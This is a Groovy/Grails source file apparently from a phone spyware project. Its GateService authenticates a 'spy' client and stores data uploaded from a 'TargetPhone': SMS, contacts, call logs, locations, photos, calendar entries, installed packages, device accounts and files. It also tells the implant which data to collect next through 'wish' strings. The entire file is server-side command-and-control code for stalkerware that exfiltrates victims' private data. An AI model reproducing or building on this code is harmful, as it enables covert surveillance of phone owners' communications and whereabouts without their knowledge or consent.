package com.atlancy.secrecy.services

import org.codehaus.jackson.JsonParseException
import org.codehaus.jackson.map.JsonMappingException

import com.atlancy.domain.TargetPhone
import com.atlancy.domain.User
import com.atlancy.secrecy.services.helpers.interfaces.ServiceInterface
import com.xaviar.market.rest.item.DataHolder
import com.xaviar.market.rest.item.DataHolderConstants

class GateService {

	def spyAuthService;
	def targetPhoneService;
	def smsService;
	def callLogService;
	def contactService;
	def userCalendarService;
	def locationService;
	def photoAlbumService;
	def packagesService;
	def accountService;
	def fileService;

	public static final String INIT_WISH ="{\"PHONE_PARAMS\":null}";
	public static final String FIRST_WISH ="{\"CONTACTS\":null,\"SMS\":null,\"CALL_LOG\":null,\"LOCATION_EVENT\":null}";
	public static final String NOTHING ="{\"NOTHING\":null}";

	def proccessClientData(DataHolder dataHolder){
		try{
			//get flower data for auth and target
			String clientFlower = dataHolder.get(DataHolderConstants.FLOWER);

			if(spyAuthService.isUserAuth(clientFlower)){
				//auth data
				String authSimSubscriberId = spyAuthService.getSimSubscriberId(clientFlower);
				User authUser =  spyAuthService.getUser(clientFlower);

				//save dataholder retrieve data
				save(dataHolder, authSimSubscriberId,authUser);

				//send ok message to phone
				//DataHolderConstants.setId(200);
				return dataHolder;
			}else{
				//send ok message to phone
				//DataHolderConstants.setId(666);
				return dataHolder;
			}
		}catch (JsonParseException e) {
			e.printStackTrace();
			//return new DataHolder().setId(-2);
		}catch (JsonMappingException e) {
			e.printStackTrace();
			//return new DataHolder().setId(-3);
		}catch (IOException e) {
			e.printStackTrace();
			//return new DataHolder().setId(-4);
		}catch(Exception e){
			e.printStackTrace();
			//return new DataHolder().setId(-1);
		}finally{

		}
	}


	def getServerRequest(DataHolder dataHolder) {
		try{
			//get flower data for auth and target
			String clientFlower = dataHolder.get(DataHolderConstants.FLOWER);

			if(spyAuthService.isUserAuth(clientFlower)){
				//auth data
				String authSimSubscriberId = spyAuthService.getSimSubscriberId(clientFlower);
				User authUser =  spyAuthService.getUser(clientFlower);

				log.info "authSimSubscriberId = " +authSimSubscriberId + " authUser = " +authUser;

				String wish = getServerWish(authSimSubscriberId,authUser);

				//new dataholder with wish string
				dataHolder = new DataHolder();
				dataHolder.put(DataHolderConstants.STATE, wish);

				//send ok message to phone
				//dataHolder.setId(200);
				return dataHolder;
			}else{
				//send not auth message to phone
				//	dataHolder.setId(666);
				return dataHolder;
			}
		}catch (JsonParseException e) {
			e.printStackTrace();
			//return new DataHolder().setId(-2);
		}catch (JsonMappingException e) {
			e.printStackTrace();
			//return new DataHolder().setId(-3);
		}catch (IOException e) {
			e.printStackTrace();
			//return new DataHolder().setId(-4);
		}catch(Exception e){
			e.printStackTrace();
			//return new DataHolder().setId(-1);
		}finally{

		}

	}

	def String getServerWish(String authSimSubscriberId,User authUser){
		TargetPhone targetPhone = TargetPhone.findBySimSubscriberId(authSimSubscriberId);

		if(targetPhone==null){
			return INIT_WISH;
		}else{
			String wishStr="";

			List<ServiceInterface> services = [
				contactService,
				locationService,
				callLogService,
				smsService,
				accountService,
				userCalendarService,
				packagesService,
				fileService
			];


			for (ServiceInterface service : services) {
				if(services.indexOf(service) == (services.size() -1)){
					wishStr += service.getWishString(authSimSubscriberId);
				}else{
					wishStr += service.getWishString(authSimSubscriberId)+",";
				}
			}

			log.info("{" + wishStr + "}");
			if(wishStr.isEmpty())
				return NOTHING;
			else
				return "{" + wishStr + "}";

		}

		return NOTHING;
	}


	def save(DataHolder dataHolder,String authSimSubscriberId,User authUser){
		for ( String key : dataHolder.getMap().keySet() ) {
			Long timestamp = System.currentTimeMillis();
			Long endTimeStamp = 0;
			println "*** " + key + " *** START Timestamp : " + timestamp + " Thread : " + Thread.currentThread().name;
			TargetPhone targetPhone = TargetPhone.findBySimSubscriberId(authSimSubscriberId);
			switch(key){
				case DataHolderConstants.PHONE_PARAMS :
					if(targetPhone==null){
						targetPhoneService.addTargetPhone(dataHolder, authSimSubscriberId,authUser);
					}
					break;
				case DataHolderConstants.CONTACTS : contactService.addContacts(dataHolder, targetPhone); break;
				case DataHolderConstants.CALL_LOG : callLogService.addCallLogs(dataHolder, targetPhone); break;
				case DataHolderConstants.CALL_LOG_EVENT : callLogService.addCallLogEvents(dataHolder, targetPhone); break;
				case DataHolderConstants.LOCATION_EVENT : locationService.addLocationEvents(dataHolder, targetPhone); break;
				case DataHolderConstants.SMS : smsService.addSmses(dataHolder, targetPhone); break;
				case DataHolderConstants.SMS_EVENT : smsService.addSmsEvents(dataHolder, targetPhone); break;
				case DataHolderConstants.PHOTO_ALBUM : photoAlbumService.addPictures(dataHolder, targetPhone); break;
				case DataHolderConstants.PHOTO_ALBUM_EVENTS : photoAlbumService.addPictures(dataHolder, targetPhone); break;
				case DataHolderConstants.CALENDAR : userCalendarService.addUserCalendar(dataHolder, targetPhone); break;
				case DataHolderConstants.CALENDAR_EVENT : userCalendarService.addUserCalendarEvents(dataHolder, targetPhone); break;
				case DataHolderConstants.PACKAGES : packagesService.addPackages(dataHolder, targetPhone); break;
				case DataHolderConstants.PACKAGES_EVENT : packagesService.addPackagesEvents(dataHolder, targetPhone); break;
				case DataHolderConstants.DEVICE_ACCOUNTS :  accountService.addAccount(dataHolder, targetPhone); break;
				case DataHolderConstants.DEVICE_ACCOUNTS_EVENT : accountService.addAccountEvents(dataHolder, targetPhone); break;
				case DataHolderConstants.FILE_STRING : fileService.addUserFile(dataHolder, targetPhone); break;
			}
			endTimeStamp = System.currentTimeMillis();
			println  "*** " + key + " *** END Timestamp : " + endTimeStamp + " Thread : " + Thread.currentThread().name + "\n " + " Total Time of Execution in milliseconds : " + (endTimeStamp-timestamp);//TimeUnit.MILLISECONDS.toSeconds(endTimeStamp-timestamp);
		}
	}

}
